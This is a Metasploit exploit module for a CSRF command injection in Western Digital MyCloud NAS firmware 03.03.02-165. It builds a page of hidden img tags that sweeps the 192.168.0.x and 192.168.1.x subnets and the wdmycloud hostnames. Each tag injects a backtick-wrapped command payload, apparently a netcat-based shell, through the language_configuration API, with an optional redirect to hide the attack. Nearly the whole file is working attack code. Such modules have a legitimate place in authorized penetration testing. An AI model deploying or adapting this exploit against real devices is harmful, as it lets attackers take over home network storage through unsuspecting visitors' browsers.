require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Western Digital MyCloud NAS CSRF Command Injection',
      'Description'     => %q{
        This module exploits a command injection vulnerability in the web
        interface of the Western Digital MyCloud NAS device. The exploit is
        written as a CSRF, since the WD MyCloud NAS will only allow API access
        from hosts on the local subnet. The exploit submits the CSRF requests
        to 192.168.1.1-254 and 192.168.0.1-254, as well as wdmycloud and
        wdmycloud.local. This device has netcat pre-installed, allowing for a
        simple netcat-based payload.
      },
      'Author'          => [ 'phikshun <0x41.phikshun[at]gmail.com>' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['URL', 'http://disconnected.io/2014/03/19/get-off-of-mycloud/'],
        ],
      'Platform'        => [ 'unix' ],
      'Arch'            => ARCH_CMD,
      'Payload'         =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'netcat',
            }
        },
      'Targets'         =>
        [
          [ 'WD MyCloud WDBCTL0040HWT 03.03.02-165', { } ] # Fixed in: 03.04.01-219
        ],
      'Privileged'      => false,
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Mar 19 2014'))

    register_options([
      OptString.new("REDIRURL", [ false, "An URL to redirect the browser after REDIRDELAY" ]),
      OptInt.new("REDIRDELAY", [ true, "Milliseconds before the browser is redirected", 5000 ])
    ], self.class)
  end

  def generate_html
    params = "format=xml&rest_method=PUT&language=" + Rex::Text.uri_encode("`#{payload.encoded}`")

    if datastore['REDIRURL'] && datastore['REDIRDELAY']
      script = "<script>window.setTimeout(function(){ window.location = " +
               "'#{datastore['REDIRURL']}'; }, #{datastore['REDIRDELAY']}); </script>"
    else
      script = ''
    end

    img_tags = (1..254).map do |fourth_octet|
      [ "<img src='http://192.168.0.#{fourth_octet}/api/1.0/rest/language_configuration?#{params}' />",
        "<img src='http://192.168.1.#{fourth_octet}/api/1.0/rest/language_configuration?#{params}' />" ]
    end.flatten.join("\n")

    "<html><body><div style='display:none'>" +
    "<img src='http://wdmycloud.local/api/1.0/rest/language_configuration?#{params}' />" +
    "<img src='http://wdmycloud/api/1.0/rest/language_configuration?#{params}' />" +
    img_tags + script + "</div></body></html>"
  end

  def on_request_uri(cli, request)
    print_status("Sending CSRF Exploit")
    send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
    handler(cli)
  end
end